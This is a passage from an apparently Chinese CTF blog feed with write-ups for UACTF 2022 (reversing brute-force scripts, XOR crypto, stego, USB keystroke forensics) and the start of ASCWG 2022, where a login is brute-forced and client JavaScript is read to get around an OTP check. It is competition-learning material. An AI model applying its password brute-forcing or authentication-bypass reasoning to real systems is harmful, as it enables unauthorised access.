punctuation">[</span><span class="token function">strlen</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      v7 <span class="token operator">=</span> <span class="token function">strtol</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token operator">&amp;</span>endptr<span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    v1 <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token operator">&amp;</span>s<span class="token punctuation">[</span>v1<span class="token punctuation">]</span> <span class="token operator">!=</span> endptr <span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> v7 <span class="token operator">==</span> v6<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>依据pwntool，通过自动化地交互，我们得到了字符串的长度以及相关信息。由于服务器已经关闭，所以我们只能采用本地模拟的方式。而且我猜测字符串的长度一定是4的倍数。</p><pre class="line-numbers language-py" data-language="py"><code class="language-py"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> repattern <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">r'\d+\.?\d*'</span><span class="token punctuation">)</span><span class="token comment"># conn = remote('challenges.uactf.com.au',30001)</span>conn <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./mason'</span><span class="token punctuation">)</span>num_add <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>num_1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    num_all_int <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    result <span class="token operator">=</span> <span class="token number">0</span>    str_add <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>conn<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span>keepends<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"concive add :"</span><span class="token operator">+</span> str_add<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">"broadcast"</span> <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">(</span>str_add<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"num_add is :"</span> <span class="token punctuation">,</span> num_add<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"num_1 is:"</span><span class="token punctuation">,</span> num_1<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"the length of flag is "</span><span class="token punctuation">,</span> x<span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">)</span>        exit<span class="token punctuation">(</span><span class="token number">99</span><span class="token punctuation">)</span>    num_add<span class="token punctuation">.</span>append<span class="token punctuation">(</span> str_add<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">"+"</span><span class="token punctuation">)</span> <span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span>    num_all <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>pattern<span class="token punctuation">,</span>str_add<span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> num_all<span class="token punctuation">:</span>        result <span class="token operator">+=</span><span class="token builtin">int</span><span class="token punctuation">(</span> i<span class="token punctuation">)</span>        num_all_int<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span> i<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"all add number:"</span> <span class="token punctuation">,</span>num_all_int<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"the add result:"</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">)</span>    num_1<span class="token punctuation">.</span>append<span class="token punctuation">(</span>num_all<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        conn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"send the add result......"</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"after the send:"</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>conn<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span>keepends<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token comment">#conn.recvuntil("Voice")</span>    <span class="token comment">#after_recv = str(conn.recvline(keepends=True))</span>    <span class="token comment">#print("server send :"+after_recv)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>再通过给出的write_up,即遍历所有可能出现的字符，进行爆破。tab_size中存储的是加数的个数、tab中存放的是每个加法公式中加数。</p><pre class="line-numbers language-py" data-language="py"><code class="language-py"><span class="token comment">#include &lt;stdio.h></span><span class="token comment">#include &lt;stdlib.h></span><span class="token builtin">int</span> main<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    __int32_t res<span class="token punctuation">,</span> check<span class="token punctuation">;</span>    __int8_t i<span class="token punctuation">;</span>    <span class="token builtin">int</span> tab_size<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token builtin">int</span> tab<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token punctuation">&#123;</span><span class="token number">9022031</span><span class="token punctuation">,</span> <span class="token number">12357936</span><span class="token punctuation">,</span> <span class="token number">2415318</span><span class="token punctuation">,</span> <span class="token number">16184558</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token punctuation">&#123;</span><span class="token number">16448419</span><span class="token punctuation">,</span> <span class="token number">7237420</span><span class="token punctuation">,</span> <span class="token number">9131202</span><span class="token punctuation">,</span> <span class="token number">11715763</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token punctuation">&#123;</span><span class="token number">8957279</span><span class="token punctuation">,</span> <span class="token number">10863672</span><span class="token punctuation">,</span> <span class="token number">2527773</span><span class="token punctuation">,</span> <span class="token number">13853931</span><span class="token punctuation">,</span> <span class="token number">12889127</span><span class="token punctuation">,</span> <span class="token number">15656069</span><span class="token punctuation">,</span> <span class="token number">6045003</span><span class="token punctuation">,</span> <span class="token number">13312869</span><span class="token punctuation">,</span> <span class="token number">6678458</span><span class="token punctuation">,</span> <span class="token number">15383265</span><span class="token punctuation">,</span> <span class="token number">6123571</span><span class="token punctuation">,</span> <span class="token number">3391779</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token punctuation">&#123;</span><span class="token number">5455897</span><span class="token punctuation">,</span> <span class="token number">15833397</span><span class="token punctuation">,</span> <span class="token number">7054469</span><span class="token punctuation">,</span> <span class="token number">14893700</span><span class="token punctuation">,</span> <span class="token number">5641234</span><span class="token punctuation">,</span> <span class="token number">12370933</span><span class="token punctuation">,</span> <span class="token number">10464366</span><span class="token punctuation">,</span> <span class="token number">8737845</span><span class="token punctuation">,</span> <span class="token number">8588291</span><span class="token punctuation">,</span> <span class="token number">6607650</span><span class="token punctuation">,</span> <span class="token number">14087216</span><span class="token punctuation">,</span> <span class="token number">6475796</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token punctuation">&#123;</span><span class="token number">7118560</span><span class="token punctuation">,</span> <span class="token number">5373450</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token punctuation">&#123;</span><span class="token number">10279125</span><span class="token punctuation">,</span> <span class="token number">6020706</span><span class="token punctuation">,</span> <span class="token number">3765174</span><span class="token punctuation">,</span> <span class="token number">3355417</span><span class="token punctuation">,</span> <span class="token number">13626908</span><span class="token punctuation">,</span> <span class="token number">5507900</span><span class="token punctuation">,</span> <span class="token number">12989108</span><span class="token punctuation">,</span> <span class="token number">6401031</span><span class="token punctuation">,</span> <span class="token number">12006999</span><span class="token punctuation">,</span> <span class="token number">3447729</span><span class="token punctuation">,</span> <span class="token number">5329581</span><span class="token punctuation">,</span> <span class="token number">11520997</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token punctuation">&#123;</span><span class="token number">5455897</span><span class="token punctuation">,</span> <span class="token number">15833397</span><span class="token punctuation">,</span> <span class="token number">7054469</span><span class="token punctuation">,</span> <span class="token number">14893700</span><span class="token punctuation">,</span> <span class="token number">5641234</span><span class="token punctuation">,</span> <span class="token number">12370933</span><span class="token punctuation">,</span> <span class="token number">10464366</span><span class="token punctuation">,</span> <span class="token number">8737845</span><span class="token punctuation">,</span> <span class="token number">8588291</span><span class="token punctuation">,</span> <span class="token number">6607650</span><span class="token punctuation">,</span> <span class="token number">14087216</span><span class="token punctuation">,</span> <span class="token number">6475796</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token punctuation">&#123;</span><span class="token number">16563743</span><span class="token punctuation">,</span> <span class="token number">15315034</span><span class="token punctuation">,</span> <span class="token number">15623837</span><span class="token punctuation">,</span> <span class="token number">10300268</span><span class="token punctuation">,</span> <span class="token number">11825995</span><span class="token punctuation">,</span> <span class="token number">8497235</span><span class="token punctuation">,</span> <span class="token number">5756897</span><span class="token punctuation">,</span> <span class="token number">2373671</span><span class="token punctuation">,</span> <span class="token number">6551149</span><span class="token punctuation">,</span> <span class="token number">181825</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token builtin">int</span> <span class="token builtin">len</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token builtin">len</span> <span class="token operator">&lt;</span> <span class="token number">8</span><span class="token punctuation">;</span> <span class="token builtin">len</span><span class="token operator">+</span><span class="token operator">+</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token builtin">int</span> c1 <span class="token operator">=</span> <span class="token number">32</span><span class="token punctuation">;</span> c1 <span class="token operator">&lt;=</span> <span class="token number">125</span><span class="token punctuation">;</span> c1<span class="token operator">+</span><span class="token operator">+</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token builtin">int</span> c2 <span class="token operator">=</span> <span class="token number">32</span><span class="token punctuation">;</span> c2 <span class="token operator">&lt;=</span> <span class="token number">125</span><span class="token punctuation">;</span> c2<span class="token operator">+</span><span class="token operator">+</span><span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>                <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token builtin">int</span> c3 <span class="token operator">=</span> <span class="token number">32</span><span class="token punctuation">;</span> c3 <span class="token operator">&lt;=</span> <span class="token number">125</span><span class="token punctuation">;</span> c3<span class="token operator">+</span><span class="token operator">+</span><span class="token punctuation">)</span>                <span class="token punctuation">&#123;</span>                    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token builtin">int</span> c4 <span class="token operator">=</span> <span class="token number">32</span><span class="token punctuation">;</span> c4 <span class="token operator">&lt;=</span> <span class="token number">125</span><span class="token punctuation">;</span> c4<span class="token operator">+</span><span class="token operator">+</span><span class="token punctuation">)</span>                    <span class="token punctuation">&#123;</span>                        i <span class="token operator">=</span> c1 <span class="token operator">|</span> <span class="token punctuation">(</span>c2 <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>c3 <span class="token operator">&lt;&lt;</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>c4 <span class="token operator">&lt;&lt;</span> <span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        srand<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>                        res <span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">*</span> <span class="token punctuation">(</span>rand<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">6</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span>res <span class="token operator">==</span> tab_size<span class="token punctuation">[</span><span class="token builtin">len</span><span class="token punctuation">]</span><span class="token punctuation">)</span>                        <span class="token punctuation">&#123;</span>                            check <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>                            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token builtin">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> tab_size<span class="token punctuation">;</span> j<span class="token operator">+</span><span class="token operator">+</span><span class="token punctuation">)</span>                            <span class="token punctuation">&#123;</span>                                res <span class="token operator">=</span> rand<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">0x1000000</span><span class="token punctuation">;</span>                                <span class="token keyword">if</span> <span class="token punctuation">(</span>tab<span class="token punctuation">[</span><span class="token builtin">len</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">!=</span> res<span class="token punctuation">)</span>                                <span class="token punctuation">&#123;</span>                                    check <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>                                    <span class="token keyword">break</span><span class="token punctuation">;</span>                                <span class="token punctuation">&#125;</span>                            <span class="token punctuation">&#125;</span>                            <span class="token keyword">if</span> <span class="token punctuation">(</span>check<span class="token punctuation">)</span>                            <span class="token punctuation">&#123;</span>                                printf<span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>                                exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token punctuation">&#125;</span>                        <span class="token punctuation">&#125;</span>                    <span class="token punctuation">&#125;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在程序运算一段时间过后，可惜并没有得出运算结果。但是总体上的思路应该是没有问题。在得到最终结果后，需转换为十六进制，再根据大端存储对原来的字符串进行还原。</p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a><strong>Crypto</strong></h2><h3 id="4-1-Non-textual-Troubles"><a href="#4-1-Non-textual-Troubles" class="headerlink" title="4-1 Non-textual Troubles"></a><strong>4-1 Non-textual Troubles</strong></h3><p>基础的异或加密。题目提供了一个用于加密的 python 程序。</p><p>题目代码主要是从 plaintext.txt 读取明文，利用随机数和字符Unicode码进行异或操作，进而生成密文写入 ciphertext.txt 当中。本题的关键在于加密过程的可逆性，首先随机数使用了种子机制，因此每次生成的随机数是相同的，其次异或操作存在 A^B = C，C^B = A，因此仅需进行相同的加密操作即可。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/4-1-1.png" alt="18"></p><pre class="line-numbers language-none"><code class="language-none">UACTF&#123;b4d_h4b175_l34d_70_py7h0n2&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a><strong>Misc</strong></h2><h3 id="5-1-Welcome"><a href="#5-1-Welcome" class="headerlink" title="5-1 Welcome"></a><strong>5-1 Welcome</strong></h3><p>签到题目，题目提供了该比赛的 Flag 格式，简单复制粘贴即可。</p><h3 id="5-2-Snake-Equality"><a href="#5-2-Snake-Equality" class="headerlink" title="5-2 Snake Equality"></a><strong>5-2 Snake Equality</strong></h3><p>一道关于 Python 内存地址的题目。题目提供了程序的 python 源码。</p><p>题目要求我们输入一个数字 n 和一个字符 c，并要求经过强制类型转换的整型数字 n 和 经过 ord() 函数解码的 c 生成的数字相同，但是加 1 后不同。</p><p>起初与 jackfromeast 进行了简单的思考，可能都在想 ord() 函数处理字符串的一个边界问题，但是并未成功，于是暂时搁置了。后面注意到它使用的是 “is” 而不是 “==”，经查询发现，“ is ”：是要求两个对象要相同，即同一个对象（相同id）；“==”：只需要值相同即可；因此改题目是对python整型内存id的考察，同样查询发现python针对整型中的0-256，会统一分配相同的id，而大于256就会独立分配id。因此我们需要做的就是在256的边界进行操作，即输入 n = 256， 字符为Unicode中对应十进制数字为256的字符即可。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/5NmtIwIgvqppomDYyFEWRw.png" alt="19"></p><pre class="line-numbers language-none"><code class="language-none">UACTF&#123;n07_411_5n4k35_423_8u117_3qu41_45_d3m0n572473d_8y_15_4nd_3qu415&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="5-3-Blurry-Eyed-Aha"><a href="#5-3-Blurry-Eyed-Aha" class="headerlink" title="5-3 Blurry-Eyed [Aha!]"></a><strong>5-3 Blurry-Eyed</strong> <strong>[Aha!]</strong></h3><p>隐写的题目还是多见多总结，没有更好的办法。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/5-3-1.png" alt="20"></p><p>原图没有一丝头绪，看到其他师傅的WriteUp说此图是一张3D图片，需要使用<a href="https://piellardj.github.io/stereogram-solver/">stereogram solver</a>工具来查看。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/5-3-2.png" alt="21"></p><h2 id="Forenics"><a href="#Forenics" class="headerlink" title="Forenics"></a><strong>Forenics</strong></h2><h3 id="6-1-Colour-Blind"><a href="#6-1-Colour-Blind" class="headerlink" title="6-1 Colour Blind"></a><strong>6-1 Colour Blind</strong></h3><p>基础的图片隐写题目。题目提供了一个图片。</p><p>简单的使用工具即可，stegSlove 可以进行不同色彩的展示，同时结合题目名称，我们可以发现 Flag。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/6-1-1.png" alt="22"></p><pre class="line-numbers language-none"><code class="language-none">UACTF&#123;r37urn_0f_7h3_c0l0r_m31573r&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="6-2-HID-Table-for-0x2"><a href="#6-2-HID-Table-for-0x2" class="headerlink" title="6-2 HID Table for 0x2"></a><strong>6-2 HID Table for 0x2</strong></h3><p>此题目是USB协议下的Keyboard键盘流量分析。</p><p>首先流量中存在设备1.2.0和设备1.3.0，通过握手信息中DESCRIPTER response device可以得到设备1.3.0为目标键盘，如下所示。所以1.3.1即为键盘通信的目的地址。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/6-2-1.png" alt="23"></p><p>由于地址不满足ip地址的规范，我们可以使用长度来进行过滤。键盘的按键信息通过中断URB_INTERRUPT来来传输，键的信息存储在Leftover Capture Data的8字节中。其中第一个字节用来表示是否按下shift键，第三个字节表示实际按下的键是什么，通过键盘表的对应可知。所以我们只需要把1.3.1发送的流量中的所有8字节dump下来并取第三字节(第一字节辅助)进行翻译即可。</p><p>值得一提的是，通过以上帖子得到的字符串没有实义，花费了许多时间。后来我发现流量中包含着键盘中的右箭头、左箭头和回车键，分别对应着0x4f,0x50以及0x28，这些键会改变字符串的输入流，所以需要设置一个字符串的指针(光标)来处理。左箭头和后箭头分别对应着左移和右移，回车对应着光标归零。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/NNLFcy8P3GDyx1lMmoUiYg.png" alt="24"></p><p>后半部分为网址，前半部分为网址中应填入的密码。最终获得flag，如下所示。</p><pre class="line-numbers language-none"><code class="language-none">UACTF&#123;234d_&#39;3m_4nd_w33p&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="6-3-Infinite-Aha"><a href="#6-3-Infinite-Aha" class="headerlink" title="6-3 Infinite [Aha!]"></a><strong>6-3 Infinite [Aha!]</strong></h3><p>ogg 格式的音频隐写也是第一次见，还是用常规方法 Audacity 分析，发现并不太行，看到其他师傅们的方法和讲解。原因在于 ogg 格式文件是由多个迷你的 oggs 容器构成，因此需要将其多个音频流进行分离，并且流媒体可以通过它的 “序列号”（OggS文件签名后的10个字节）来识别。这里可以使用工具 oggz-tools。</p><pre class="line-numbers language-none"><code class="language-none">apt-get install oggz-toolsoggz rip -i 0 infinite.ogg -o stream0.oggoggz rip -i 1 infinite.ogg -o stream1.oggoggz rip -i 2 infinite.ogg -o stream2.ogg<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>接着使用 audacity 查看生成的 stream1.ogg 和 stream2.ogg 文件的频谱图，分别获得 flag 的部分，进行拼接即可。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/forenics-3.png" alt="25"></p><pre class="line-numbers language-none"><code class="language-none">UACTF&#123;t01nf1n1ty4ndb3y0nd&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
    
    
    <summary type="html">&lt;p&gt;简介：&lt;/p&gt;
&lt;p&gt;本文为UACTF 2022比赛的WriteUp。本次还是与NING0121、meishijia一起组队参赛，最终在447支参赛队伍中排名21位。打怪升级中，再接再厉～&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://laobameishijia.github.io/category/CTF/"/>
    
    
    <category term="比赛" scheme="https://laobameishijia.github.io/tag/%E6%AF%94%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>Arab Security Cyber Wargames 2022</title>
    <link href="https://laobameishijia.github.io/2022/08/15/ascwg-2022-writeup/"/>
    <id>https://laobameishijia.github.io/2022/08/15/ascwg-2022-writeup/</id>
    <published>2022-08-15T09:25:00.000Z</published>
    <updated>2022-10-23T06:50:14.676Z</updated>
    
    <content type="html"><![CDATA[<p>本文为Arab Security Cyber Wargames 2022比赛的WriteUp。作为阿拉伯国家的CTF比赛，发现中东地区的网络安全氛围也是非常好，交流中可以学习到很多。最终我们在737支参赛队伍排名第67位。</p><p>Sometimes you win, sometimes you learn.</p><span id="more"></span><p>说明：本WriteUp中标志[Aha!]是赛后总结并参考其他师傅的WriteUp完成的，毕竟没有做出来的题更要记录学习。</p><h2 id="1-Web"><a href="#1-Web" class="headerlink" title="1 Web"></a><strong>1 Web</strong></h2><h3 id="1-1-Drunken-Developer"><a href="#1-1-Drunken-Developer" class="headerlink" title="1-1 Drunken Developer"></a>1-1 <strong>Drunken Developer</strong></h3><p>本关为Web题目的第一题。网站给出了一个登陆界面，包含用户名和密码。查看网页源码发现其中嵌入了管理员的用户名，再没有其他信息的情况下首先用爆破的方法尝试。爆破出管理员密码后登陆进入即获得Flag。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/1-1-1.png" alt="1-1-1"></p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/Ad5EXRN42DyBWy38v8uwGA.png" alt="1-1-2"></p><p>登陆进入后获得Flag：<code>ASCWG&#123;\%Sca21_QS_2\!3eSKC&amp;qw9@_warmup&#125;</code></p><h3 id="1-2-Konan"><a href="#1-2-Konan" class="headerlink" title="1-2 Konan"></a>1-2 <strong>Konan</strong></h3><p>本题为Web题目的第二道题。</p><p>进入网站后是一个登陆页面，在输入用户名为admin或者root后会动画地跳出OTP(One Time Password)的输入框。但是我们没有其他获得OTP，而且主办方说了此题不涉及爆破，所以我们需要另寻它路。</p><p><strong>此题目展示了非常好的解决Web题目的思路：首先观察行为所生成的请求包和响应包的参数，然后在网页的js或者其他脚本源码中对参数进行搜索，从而获得前后端交互的API和逻辑。</strong></p><p>我们可以看到，在输入错误的OTP后，服务器端会返回存有errors和reason的响应包。在primary.js中搜索相关参数我们即可获得客户端的处理逻辑。                 </p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/1-2-1.png" alt="1-2-1"></p><p>由下可见，当服务器端的相应包中的errors参数为false时，客户端会生成Ticket并且访问/admin页面。</p><pre class="line-numbers language-js" data-language="js"><code class="language-js">## primary<span class="token punctuation">.</span>js line <span class="token number">534</span><span class="token function">$</span><span class="token punctuation">(</span>document<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">ready</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#subB'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'submit'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>e<span class="token punctuation">.</span><span class="token function">preventDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>firstTime<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">var</span> dataSend<span class="token operator">=</span><span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"user"</span><span class="token operator">:</span><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#user'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">val</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token keyword">var</span> dataSend<span class="token operator">=</span><span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"OTP"</span><span class="token operator">:</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#OTP'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">val</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>$<span class="token punctuation">.</span><span class="token function">ajax</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>url<span class="token operator">:</span> link<span class="token punctuation">,</span>type<span class="token operator">:</span> <span class="token string">'POST'</span><span class="token punctuation">,</span>data<span class="token operator">:</span> dataSend<span class="token punctuation">,</span>contentType<span class="token operator">:</span> <span class="token string">"application/json; charset=utf-8"</span><span class="token punctuation">,</span><span class="token function-variable function">success</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>exists <span class="token operator">==</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>link<span class="token 